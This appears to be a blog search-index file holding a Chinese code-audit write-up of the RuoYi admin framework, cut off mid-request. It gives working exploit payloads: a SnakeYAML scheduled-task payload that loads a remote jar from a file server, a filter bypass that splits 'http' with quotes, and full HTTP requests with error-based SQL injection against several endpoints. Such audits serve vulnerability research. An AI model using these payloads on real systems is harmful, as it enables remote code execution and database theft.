<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Ruoyi代码审计</title>
    <link href="/2024/04/26/Ruoyi%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2024/04/26/Ruoyi%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="搭建环境："><a href="#搭建环境：" class="headerlink" title="搭建环境："></a>搭建环境：</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://gitee.com/y_project/RuoYi.git<br></code></pre></td></tr></table></figure><p>本次的ruoyi版本为4.0。</p><p>使用<code>git checkout [版本号]</code>进行版本切换。</p><p>使用<code>git tag</code>可以查看很多版本列表</p><h1 id="审计过程："><a href="#审计过程：" class="headerlink" title="审计过程："></a>审计过程：</h1><h2 id="1-shiro组件："><a href="#1-shiro组件：" class="headerlink" title="1. shiro组件："></a>1. shiro组件：</h2><h3 id="1-1-爆破shiro密码："><a href="#1-1-爆破shiro密码：" class="headerlink" title="1.1 爆破shiro密码："></a>1.1 爆破shiro密码：</h3><p><img src="/./../blog_image/image-20240306084805550.png" alt="image-20240306084805550"></p><p>点击检测当前密钥后再点击爆破密码就会自动执行shiro密码爆破。</p><h3 id="1-2-执行命令："><a href="#1-2-执行命令：" class="headerlink" title="1.2 执行命令："></a>1.2 执行命令：</h3><p>执行shiro反序列化，任意执行命令。</p><p>点击了检测当前利用链，就可以判断是否存在反序列化。</p><p><img src="/./../blog_image/image-20240306085140804.png" alt="image-20240306085140804"></p><p>执行任意命令：</p><p><img src="/./../blog_image/image-20240306085311381.png" alt="image-20240306085311381"></p><h2 id="2-定时任务："><a href="#2-定时任务：" class="headerlink" title="2. 定时任务："></a>2. 定时任务：</h2><h3 id="如何使用定时任务？"><a href="#如何使用定时任务？" class="headerlink" title="如何使用定时任务？"></a>如何使用定时任务？</h3><p>首先需要注入到bean中：</p><p><img src="/./../blog_image/image-20240306095244421.png" alt="image-20240306095244421"></p><p>接着编写cron表达式，需要指定哪个bean中的哪个方法。</p><p><img src="/./../blog_image/image-20240306095312930.png" alt="image-20240306095312930"></p><p><img src="/./../blog_image/image-20240306095224450.png" alt="image-20240306095224450"></p><p>定时任务存在调用任意类的任意方法，如图所示：</p><p><img src="/./../blog_image/image-20240307095915440.png" alt="image-20240307095915440"></p><p>从请求中获取到了job的相关信息，其中包括job的调用字符串，因此可以调用任意类。</p><h3 id="版本"><a href="#版本" class="headerlink" title="版本&lt;&#x3D;4.6.2 RCE："></a>版本&lt;&#x3D;4.6.2 RCE：</h3><p>影响版本：<code>RuoYi&lt;4.6.2</code></p><p>简要描述：由于若依后台计划任务处，对于传入的”调用目标字符串”没有任何校验，导致攻击者可以调用任意类、方法及参数触发反射执行命令。</p><p>当前复现版本为<code>若依4.0</code></p><p>下载poc：</p><p><a href="https://github.com/artsploit/yaml-payload">artsploit&#x2F;yaml-payload: A tiny project for generating SnakeYAML deserialization payloads (github.com)</a></p><p>编写poc的yaml文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!!javax.script.ScriptEngineManager</span> [<br>  <span class="hljs-type">!!java.net.URLClassLoader</span> [[<br>    <span class="hljs-type">!!java.net.URL</span> [<span class="hljs-string">&quot;http://127.0.0.1:88/yaml-payload.jar&quot;</span>]<br>  ]]<br>]<br></code></pre></td></tr></table></figure><p>修改执行命令：</p><p><img src="/./../blog_image/image-20240307100835373.png" alt="image-20240307100835373"></p><p>编译执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac .\src\artsploit\AwesomeScriptEngineFactory.java<br>jar -cvf yaml-payload.jar -C src/ .<br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20240307101637234.png" alt="image-20240307101637234"></p><p>启动一个python的文件服务：</p><p><img src="/./../blog_image/image-20240307101658018.png" alt="image-20240307101658018"></p><p>新增一个定时任务：</p><p><img src="/./../blog_image/image-20240307101851020.png" alt="image-20240307101851020"></p><p>poc如下：</p><blockquote><p>org.yaml.snakeyaml.Yaml.load(‘!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [“<a href="http://127.0.0.1:88/yaml-payload.jar%22]]]]">http://127.0.0.1:88/yaml-payload.jar&quot;]]]]</a>‘)</p></blockquote><p>执行成功：</p><p><img src="/./../blog_image/image-20240307103326216.png" alt="image-20240307103326216"></p><p>这里复刻很奇怪，如果若依使用了高版本的jdk(jdk19)即可复现成功，但是使用1.8就不行，不知道为什么。</p><blockquote><p>Caused by: java.lang.UnsupportedClassVersionError: artsploit&#x2F;AwesomeScriptEngineFactory has been compiled by a more recent version of the Java Runtime (class file version 63.0), this version of the Java Runtime only recognizes class file versions up to 52.0</p></blockquote><h3 id="版本4-6-2："><a href="#版本4-6-2：" class="headerlink" title="版本4.6.2："></a>版本4.6.2：</h3><p>当前审计版本<code>4.6.2</code>:</p><p>只判断了rmi服务。</p><p><img src="/./../blog_image/image-20240307105411783.png" alt="image-20240307105411783"></p><p>一样可以弹：</p><p>poc和上面一样：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">org.yaml.snakeyaml.Yaml.<span class="hljs-keyword">load</span>(&#x27;!<span class="hljs-title">!javax.script.ScriptEngineManager</span> [!<span class="hljs-title">!java.net.URLClassLoader</span> [[!<span class="hljs-title">!java.net.URL</span> [<span class="hljs-string">&quot;http://127.0.0.1:88/yaml-payload.jar&quot;</span>]]]]&#x27;)<br></code></pre></td></tr></table></figure><h3 id="版本4-7-0："><a href="#版本4-7-0：" class="headerlink" title="版本4.7.0："></a>版本4.7.0：</h3><p>添加任务中存在校验，而且是后端校验：</p><p><img src="/./../blog_image/image-20240307110008645.png" alt="image-20240307110008645"></p><p>但是没有黑名单校验：</p><p><img src="/./../blog_image/image-20240307110118297.png" alt="image-20240307110118297"></p><p>因此还是可以bpass，同样的poc，只需要使用单引号即可绕过</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.yaml</span><span class="hljs-selector-class">.snakeyaml</span><span class="hljs-selector-class">.Yaml</span><span class="hljs-selector-class">.load</span>(<span class="hljs-string">&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;&#x27;</span>h<span class="hljs-string">&#x27;&#x27;</span>t<span class="hljs-string">&#x27;&#x27;</span>t<span class="hljs-string">&#x27;&#x27;</span>p<span class="hljs-string">&#x27;://127.0.0.1:88/yaml-payload.jar&quot;]]]]&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20240307110247325.png" alt="image-20240307110247325"></p><h3 id="版本-4-7-2"><a href="#版本-4-7-2" class="headerlink" title="版本&gt;4.7.2:"></a>版本&gt;4.7.2:</h3><p>在添加中存在校验</p><p><img src="/./../blog_image/image-20240307104929203.png" alt="image-20240307104929203"></p><p>存在黑名单校验：</p><p><img src="/./../blog_image/image-20240307105040908.png" alt="image-20240307105040908"></p><p>还存在rmi校验，不知道如何bypass。</p><p>发现可以结合sql注入，然后修改字段最终实现bypass。</p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><blockquote><p>如果想使用ruoyi定时任务实现rce，可以先直接调用<a href="github.com"><a href="https://github.com/artsploit/yaml-payload">artsploit&#x2F;yaml-payload: A tiny project for generating SnakeYAML deserialization payloads (github.com)</a></a>的poc，如果是小于4.6.2版本则直接可以实现rce。在小于4.7.2版本中会校验是否存在rmi，ldap服务，以及对字符串判断是否存在http字样。如果存在http字样，可以使用单引号绕过，如<code>&#39;h&#39;&#39;t&#39;&#39;t&#39;&#39;t&#39;</code>。</p><p>在大于4.7.2版本则会添加类黑名单。</p></blockquote><h2 id="3-sql注入："><a href="#3-sql注入：" class="headerlink" title="3. sql注入："></a>3. sql注入：</h2><p>查询sql注入的方法可以从mybatis的配置文件入手，全局搜索<code>$&#123;</code>即可。</p><p><img src="/./../blog_image/image-20240307140934631.png" alt="image-20240307140934631"></p><h3 id="3-1-查询角色管理列表sql注入："><a href="#3-1-查询角色管理列表sql注入：" class="headerlink" title="3.1 查询角色管理列表sql注入："></a>3.1 查询角色管理列表sql注入：</h3><p>路径为<code>/system/role/list</code></p><p>查询mybatis的xml文件，可以查询到没有预编译的sql：</p><p><img src="/./../blog_image/image-20240307141034016.png" alt="image-20240307141034016"></p><p>查询到controller层，如图所示：</p><p><img src="/./../blog_image/image-20240307141118479.png" alt="image-20240307141118479"></p><p>由于这个role对象是从前端传进来的，而且是可控的，service层也是直接调用了，没有进行参数的校验，因此这个role对象是可控的。直接传递到dao层。</p><p>因此注入点是<code>params[dataScope]</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/role/list</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>185<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;110&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/system/role<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=90aee3bf-d1af-480c-90ce-cd2ff50b733b<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-sas">pageSize=<span class="hljs-variable">&amp;pageNum</span>=<span class="hljs-variable">&amp;orderByColumn</span>=<span class="hljs-variable">&amp;isAsc</span>=<span class="hljs-variable">&amp;roleName</span>=<span class="hljs-variable">&amp;roleKey</span>=<span class="hljs-variable">&amp;status</span>=<span class="hljs-variable">&amp;params</span>[beginTime]=<span class="hljs-variable">&amp;params</span>[endTime]=<span class="hljs-variable">&amp;params</span>[dataScope]=<span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> updatexml(1,concat(0x7e,(<span class="hljs-keyword">SELECT</span> database())),0x7e))</span><br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20240307140735953.png" alt="image-20240307140735953"></p><p>或者是使用<code>extractvalue</code>进行注入：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">params<span class="hljs-selector-attr">[dataScope]</span>=and <span class="hljs-built_in">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,(select <span class="hljs-built_in">database</span>()),<span class="hljs-number">0</span>x7e))<br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20240307140651560.png" alt="image-20240307140651560"></p><h3 id="3-2-查询用户列表："><a href="#3-2-查询用户列表：" class="headerlink" title="3.2 查询用户列表："></a>3.2 查询用户列表：</h3><p>路径为<code>/system/user/list</code></p><p><img src="/./../blog_image/image-20240307142001933.png" alt="image-20240307142001933"></p><p>也是存在dataScope注入点。</p><p>service层：</p><p><img src="/./../blog_image/image-20240307142049062.png" alt="image-20240307142049062"></p><p>dao层：</p><p><img src="/./../blog_image/image-20240307142105532.png" alt="image-20240307142105532"></p><p>也是一样的，user对象从前端传入后就没有经过校验，由于user的dataScope属性是可控的，因此这个sql注入点是存在的。</p><p>访问路径：<code>/system/user/list</code></p><p><img src="/./../blog_image/image-20240307142321189.png" alt="image-20240307142321189"></p><p>poc如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/user/list</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>218<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;110&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/system/user<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=6ea4c4cf-c715-4be1-8388-30b7dc810de9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-sas">pageSize=10<span class="hljs-variable">&amp;pageNum</span>=1<span class="hljs-variable">&amp;orderByColumn</span>=createTime<span class="hljs-variable">&amp;isAsc</span>=desc<span class="hljs-variable">&amp;deptId</span>=<span class="hljs-variable">&amp;parentId</span>=<span class="hljs-variable">&amp;loginName</span>=<span class="hljs-variable">&amp;phonenumber</span>=<span class="hljs-variable">&amp;status</span>=<span class="hljs-variable">&amp;params</span>[beginTime]=<span class="hljs-variable">&amp;params</span>[endTime]=<span class="hljs-variable">&amp;params</span>[dataScope]=<span class="hljs-keyword">and</span> extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span> versio<span class="hljs-meta">n</span>()),0x7e))</span><br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20240307142817981.png" alt="image-20240307142817981"></p><p>或者修改为<code>&amp;params[dataScope]=and(select updatexml(1,concat(0x7e,(SELECT database())),0x7e))</code></p><p><img src="/./../blog_image/image-20240307142918619.png" alt="image-20240307142918619"></p><h3 id="3-3-角色导出："><a href="#3-3-角色导出：" class="headerlink" title="3.3 角色导出："></a>3.3 角色导出：</h3><p>请求路径为：<code>/system/role/expor</code></p><p>审计了一下就是调用了查询角色列表，因此查询角色列表的sql注入可以复用：</p><p><img src="/./../blog_image/image-20240307143454429.png" alt="image-20240307143454429"></p><p>poc如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/role/export</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>75<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;110&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/system/role<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=6ea4c4cf-c715-4be1-8388-30b7dc810de9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-stylus">params<span class="hljs-selector-attr">[dataScope]</span>=and <span class="hljs-built_in">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,(select <span class="hljs-built_in">database</span>()),<span class="hljs-number">0</span>x7e))</span><br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20240307143133597.png" alt="image-20240307143133597"></p><h3 id="3-4-导出用户列表："><a href="#3-4-导出用户列表：" class="headerlink" title="3.4 导出用户列表："></a>3.4 导出用户列表：</h3><p>请求路径为<code>/system/user/export</code></p><p>和上面的查询用户列表一样，可以复用：</p><p><img src="/./../blog_image/image-20240307143252886.png" alt="image-20240307143252886"></p><p>poc如下，可也使用<code>and(select updatexml(1,concat(0x7e,(SELECT database())),0x7e))</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/user/export</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>75<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;110&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/system/role<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=6ea4c4cf-c715-4be1-8388-30b7dc810de9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-stylus">params<span class="hljs-selector-attr">[dataScope]</span>=and <span class="hljs-built_in">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,(select <span class="hljs-built_in">database</span>()),<span class="hljs-number">0</span>x7e))</span><br></code></pre></td></tr></table></figure><h3 id="3-5-查询已分配角色列表："><a href="#3-5-查询已分配角色列表：" class="headerlink" title="3.5 查询已分配角色列表："></a>3.5 查询已分配角色列表：</h3><p>路径为<code>/system/role/authUser/allocatedList</code></p><p>同理查询<code>$&#123;</code>，发现了<code>selectAllocatedList</code>这个方法存在可疑的sql注入点：</p><p><img src="/./../blog_image/image-20240307143553612.png" alt="image-20240307143553612"></p><p>追踪到controller层：</p><p><img src="/./../blog_image/image-20240307143659323.png" alt="image-20240307143659323"></p><p>前端点击：</p><p><img src="/./../blog_image/image-20240307143939865.png" alt="image-20240307143939865"></p><p>poc如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/role/authUser/allocatedList</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>166<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;110&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/system/role/authUser/1<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=6ea4c4cf-c715-4be1-8388-30b7dc810de9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-sas">pageSize=10<span class="hljs-variable">&amp;pageNum</span>=1<span class="hljs-variable">&amp;orderByColumn</span>=createTime<span class="hljs-variable">&amp;isAsc</span>=desc<span class="hljs-variable">&amp;roleId</span>=1<span class="hljs-variable">&amp;loginName</span>=<span class="hljs-variable">&amp;phonenumber</span>=<span class="hljs-variable">&amp;params</span>[dataScope]=<span class="hljs-keyword">and</span> extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span> database()),0x7e))</span><br></code></pre></td></tr></table></figure><p>也可以使用</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&amp;params<span class="hljs-selector-attr">[dataScope]</span>=<span class="hljs-built_in">and</span>(select <span class="hljs-built_in">updatexml</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,(SELECT <span class="hljs-built_in">database</span>())),<span class="hljs-number">0</span>x7e))<br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20240307145020776.png" alt="image-20240307145020776"></p><h3 id="3-6-查询未分类角色列表："><a href="#3-6-查询未分类角色列表：" class="headerlink" title="3.6 查询未分类角色列表："></a>3.6 查询未分类角色列表：</h3><p>查询接口：<code>/system/role/authUser/unallocatedList</code></p><p><img src="/./../blog_image/image-20240307145418345.png" alt="image-20240307145418345"></p><p>poc如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/role/authUser/unallocatedList</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>173<br><span 